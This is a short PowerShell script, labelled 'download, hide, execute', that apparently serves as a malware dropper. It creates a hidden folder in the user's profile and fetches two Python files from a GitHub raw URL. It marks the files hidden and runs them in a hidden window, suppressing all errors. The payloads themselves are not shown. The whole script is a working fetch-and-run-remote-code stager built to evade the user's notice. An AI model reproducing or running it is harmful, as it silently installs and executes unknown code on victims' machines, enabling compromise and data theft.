# ============================================
# pp.ps1 - download, hide, execute (FIXED)
# ============================================

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$configPath = Join-Path $env:USERPROFILE ".configs"
if (-not (Test-Path -Path $configPath)) {
    New-Item -Path $configPath -ItemType Directory -Force | Out-Null
}

try {
    $d = Get-Item -LiteralPath $configPath -Force
    $d.Attributes = $d.Attributes -bor [System.IO.FileAttributes]::Hidden
} catch {}

function Save-HiddenFile {
    param([string]$Url, [string]$Path)
    if (Test-Path -LiteralPath $Path) {
        try { (Get-Item -LiteralPath $Path -Force).Attributes = 'Normal' } catch {}
    }
    Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
    $f = Get-Item -LiteralPath $Path -Force
    $f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden
}

# ---- 1. pypy.py (source = client.py) ----
$finalPath = Join-Path $configPath "client.py"
try {
    Save-HiddenFile -Url "https://raw.githubusercontent.com/boss-defender/export/main/client.py" -Path $finalPath
} catch {}

# ---- 2. auto.py ----
$finalPath3 = Join-Path $configPath "auto.py"
try {
    Save-HiddenFile -Url "https://raw.githubusercontent.com/boss-defender/export/main/auto.py" -Path $finalPath3
} catch {}

# ---- 5. Launch (single process) ----

$launchArgs = @('-3', '-u', "`"$finalPath3`"", "`"$finalPath`"", '--hidden')

Start-Process -FilePath 'py' -ArgumentList $launchArgs -WorkingDirectory $configPath -WindowStyle Hidden
